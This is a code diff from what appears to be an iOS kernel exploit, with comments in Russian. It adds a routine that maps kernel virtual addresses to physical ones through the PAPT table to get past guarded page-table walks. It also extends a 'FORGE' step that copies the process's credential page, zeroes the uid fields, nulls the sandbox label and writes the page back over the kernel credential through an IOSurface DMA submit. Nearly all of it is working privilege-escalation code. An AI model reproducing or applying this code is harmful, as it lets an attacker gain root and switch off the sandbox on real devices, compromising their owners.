@@ -99,6 +99,47 @@ static int kpZoneClass(uint64_t va)
     return (f >> 6) & 1;
 }
 
+// 1.9.251 (р.63 Q2): zone-map VA→PA через PAPT/арену ядра — БЕЗ обхода таблиц
+// (ветка VM/RO охраняется deadly-фреймами 0x15/0xb, walker туда не ходит).
+// Сам zalloc резолвит zone-VA через этот же реестр (резолвер 0x87b02e0):
+// entries stride 0x18, PA = entryPA + (VA − VAbase). Расклад полей записи
+// авто-детектится (р.63 {VA,+0x08 PA,+0x10 np} vs сток {PA@0,VA@8,np@16}):
+// VA-поле = qword формы 0xffffff…, PA-поле = второе. Рет 0 = не покрыто.
+static uint64_t kpZoneVtoP(uint64_t va)
+{
+    uint64_t tbl = 0, n = 0;
+    if (kp_papt_table_va && kp_papt_table_n) { tbl = kp_papt_table_va; n = kp_papt_table_n; }
+    else if (ksymbol(libsptm_papt_ranges)) {
+        tbl = kread_ptr(ksymbol(libsptm_papt_ranges));
+        n = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));
+    }
+    if (!tbl || !n || n > 512) return 0;
+    for (uint64_t i = 0; i < n; i++) {
+        if (kp_papt_format == 1) {
+            // 16-B fast-path: {va_base@0, start_pfn(u32)@8, count(u24)|flags(u8)@12}
+            uint64_t vaBase = 0; uint32_t startPfn = 0, rawCnt = 0;
+            kreadbuf(tbl + i * 16, &vaBase, 8);
+            kreadbuf(tbl + i * 16 + 8, &startPfn, 4);
+            kreadbuf(tbl + i * 16 + 12, &rawCnt, 4);
+            uint64_t np = rawCnt & 0xFFFFFF;
+            if (np && va >= vaBase && va < vaBase + np * 0x4000ULL)
+                return (uint64_t)startPfn * 0x4000ULL + (va - vaBase);
+            continue;
+        }
+        uint64_t q[3] = {0, 0, 0};
+        kreadbuf(tbl + i * 24, q, 24);
+        uint64_t vaBase = 0, paBase = 0;
+        for (int k = 0; k < 2; k++) {
+            if ((q[k] & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) { vaBase = q[k]; paBase = q[k ^ 1]; break; }
+        }
+        uint64_t np = q[2] & 0xFFFFFFFFULL;
+        if (!np) np = q[2];   // некоторые расклады — полный qword
+        if (vaBase && np && np < 0x100000 && va >= vaBase && va < vaBase + np * 0x4000ULL)
+            return paBase + (va - vaBase);
+    }
+    return 0;
+}
+
 // The EL2 domain faults in the physical aperture when read via the socket
 // primitive — PANIC. 1.9.6: the old "whole 01..02 band minus kernel image"
 // guard also blocked the libsptm PAPT table, which lives in ordinary EL1
@@ -7559,6 +7600,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t e1 = early_kread64(buf247 + 0x38);
             kpNote(r, [NSString stringWithFormat:@"      buffer пост-submit: flags=%#x entry0=%#018llx entry1=%#018llx — %@",
                       f2, (unsigned long long)e0, (unsigned long long)e1,
+                      changed ? @"ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)" :
                       (uint32_t)e0 == ctlPFN ? @"яд НА МЕСТЕ (entries не прочитаны: stale-ветка/sanity — копаем [desc+0x88] wire list)" :
                       (uint32_t)e0 == pfn32 ? @"ОТКАТ в оригинал (пересборка из wire list [desc+0x88] — следующая цель)" : @"ТРЕТЬЕ ЗНАЧЕНИЕ"]);
         }
@@ -7623,6 +7665,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint64_t pageVA = ucF & ~0x3fffULL;
                 uint32_t uoff = (uint32_t)(ucF & 0x3fff);
                 uint64_t pagePA = kvtophys(pageVA);
+                // 1.9.251 (р.63): walker ветки VM/RO охраняется deadly-таблицами
+                // (census 0x15) → pagePA=0. Fallback — PAPT/арена ядра (kpZoneVtoP).
+                if (!pagePA) pagePA = kpZoneVtoP(pageVA);
                 // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
                 // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
                 uint64_t pkva = pagePA ? phystokv(pagePA) : 0;
@@ -7632,9 +7677,11 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 BOOL paOK = (q0a == q0b) && (uidViaPA == (uint32_t)getuid());
                 kpNote(r, [NSString stringWithFormat:@"  [FORGE] pageVA=%#llx pagePA=%#llx uoff=%#x — валидация PA: %@",
                           (unsigned long long)pageVA, (unsigned long long)pagePA, uoff, paOK ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ — записи не будет"]);
-                if (paOK && uoff + 0xc0 <= 0x1000) {
-                    uint8_t fbuf[0x1000];
-                    for (uint32_t i = 0; i < 0x1000; i += 8) *(uint64_t *)(fbuf + i) = early_kread64(pageVA + i);
+                // 1.9.251: форжим ВСЮ 16KB-страницу — ucred сидит на uoff=0x38b0,
+                // 4KB записи не доставало (rect 64×64 = 0x4000 в tsdF ниже).
+                if (paOK && uoff + 0xc0 <= 0x4000) {
+                    uint8_t fbuf[0x4000];
+                    for (uint32_t i = 0; i < 0x4000; i += 8) *(uint64_t *)(fbuf + i) = early_kread64(pageVA + i);
                     *(uint32_t *)(fbuf + uoff + 0x18) = 0;   // cr_uid
                     *(uint32_t *)(fbuf + uoff + 0x1c) = 0;   // cr_ruid
                     *(uint32_t *)(fbuf + uoff + 0x20) = 0;   // cr_svuid
@@ -7644,7 +7691,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     *(uint64_t *)(fbuf + uoff + 0x78) = 0;   // cr_label = NULL (sandbox off)
                     IOSurfaceLock(srcS, 0, NULL);
                     uint8_t *sp2 = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
-                    if (sp2) memcpy(sp2, fbuf, 0x1000);
+                    if (sp2) memcpy(sp2, fbuf, 0x4000);
                     IOSurfaceUnlock(srcS, 0, NULL);
                     uint32_t fPFN = (uint32_t)(pagePA >> 14);
                     // слоты (restore'нуты к этому моменту) — заново на ucredPagePA
@@ -7670,11 +7717,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                     if (nDep) kpNote(r, [NSString stringWithFormat:@"  [FORGE] DEP-хиты перепатчены на ucredPFN (%d шт)", nDep]);
                     // victim#2 submit (bit43=0 — свежий rebuild из отравленного источника)
+                    // 1.9.251: rect 64×64×4 = 0x4000 — форж покрывает всю 16KB-страницу ucred
                     uint8_t tsdF[0x1B0];
                     memcpy(tsdF, tsdV, sizeof(tsdF));
                     *(uint32_t *)(tsdF + 0) = srcID;
                     *(uint32_t *)(tsdF + 4) = dstID;
                     *(uint64_t *)(tsdF + 8) = 1;
+                    *(uint32_t *)(tsdF + 0x0C) = 64;
+                    *(uint32_t *)(tsdF + 0x10) = 64;
                     kern_return_t fkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdF, sizeof(tsdF), NULL, NULL, NULL, NULL);
                     kpNote(r, [NSString stringWithFormat:@"  [FORGE] victim#2 submit (ucredPA): kr=0x%x — жду DMA в ucred", fkr]);
                     usleep(400000);
